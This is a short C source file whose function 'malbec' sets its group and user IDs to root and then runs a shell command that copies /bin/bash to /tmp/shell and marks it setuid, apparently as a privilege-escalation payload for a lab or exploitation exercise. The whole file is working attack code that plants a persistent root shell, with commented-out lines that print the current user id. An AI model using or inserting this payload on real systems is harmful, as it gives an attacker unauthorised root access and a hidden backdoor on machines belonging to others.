#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int malbec() { 
    setgid(0); 
    setuid(0); 
    //system('echo "running as: `id`"');
    system("/bin/bash -c 'cp /bin/bash /tmp/shell && chmod +s /tmp/shell && chmod o+x /tmp/shell'"); return 0;}
//int main() { system("echo `id`"); return 0;}
